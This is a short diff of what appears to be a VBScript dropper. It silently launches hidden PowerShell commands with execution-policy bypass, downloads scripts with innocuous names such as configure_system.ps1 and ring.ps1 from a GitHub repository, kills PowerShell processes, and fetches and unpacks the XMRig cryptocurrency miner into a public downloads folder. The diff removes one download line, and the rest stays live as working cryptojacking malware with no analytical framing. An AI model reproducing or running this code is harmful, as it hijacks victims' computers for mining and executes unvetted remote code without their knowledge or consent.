@@ -18,7 +18,6 @@ objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubu
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
 objShell.Run "powershell.exe -Command Get-Process -Name powershell | Stop-Process -Force", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
-objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/rings.cmd -OutFile C:\Users\Public\Downloads\rings.cmd", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip", 0, True
 objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' -DestinationPath 'C:\Users\Public\Downloads\' -Force", 0, True
 WScript.Sleep 2000
